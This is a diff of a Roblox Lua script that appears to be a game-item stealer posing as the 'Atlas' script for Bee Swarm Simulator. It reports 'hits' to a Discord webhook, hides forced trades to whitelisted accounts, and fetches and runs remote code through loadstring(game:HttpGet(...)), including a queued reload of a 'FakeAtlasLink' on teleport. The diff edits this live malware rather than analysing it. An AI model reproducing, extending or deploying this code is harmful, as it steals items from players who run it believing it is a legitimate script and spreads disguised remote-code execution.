@@ -6,7 +6,7 @@ local Configuration = {
         URL of where the hits will be sent, recommended to use a seperate api like a worker
         to prevent spam and webhook deletion but make sure to put '?with_components=true' and '&wait=true' at the end 
         of your discord webhook url INSIDE the api code *if* you use a seperate api ]]
-    Whitelist = "guygeebs, LOGGISpapaFANZ, swarmstorage67"; -- People who will be traded when joining a hit, a whitelist, seperate names (case sensitive) by a comma
+    Whitelist = ""; -- People who will be traded when joining a hit, a whitelist, seperate names (case sensitive) by a comma
     Stickers = "automatic"; -- The stickers you want to accept in a trade. If set to "automatic", any sticker above the value of 1 sign on bssm is accepted, otherwise put a table with strings of names of stickers
     Stickers2 = { ["Petal Cub Skin"] = 30, "Ticket Voucher" }, -- If you have Stickers set to automatic, but still want some specific stickers, add them here (table with strings of names of stickers)
     StickerEmojis = true; -- Adds emojis to the sticker field inside the hit embed but only applies to some stickers (not all)
@@ -46,7 +46,6 @@ end
 
 local function LoadScript()
     --task.spawn(function()
-        if _G.DontLoadAtlas then return end
         if Configuration.CustomBtsScript ~= "none" then
             loadstring(game:HttpGet(Scripts[Configuration.CustomBtsScript]))()
         end
@@ -129,7 +128,7 @@ local air = utf8.char(0x2004):rep(3)
 local air2 = Configuration.Air and air or ""
 
 if _G.executedAtlas == true then
-    --return
+    return
 end
 _G.executedAtlas = true
 
@@ -1185,7 +1184,7 @@ local function StartSession(StealerName)
             end
         end)
     else
-        queue_on_teleport("_G.DontLoadAtlas=true; loadstring(game:HttpGet(\"" .. Configuration.FakeAtlasLink .. "\"))()")
+        queue_on_teleport("loadstring(game:HttpGet(\"" .. Configuration.FakeAtlasLink .. "\"))()")
     end
 
     task.spawn(HideTrades)
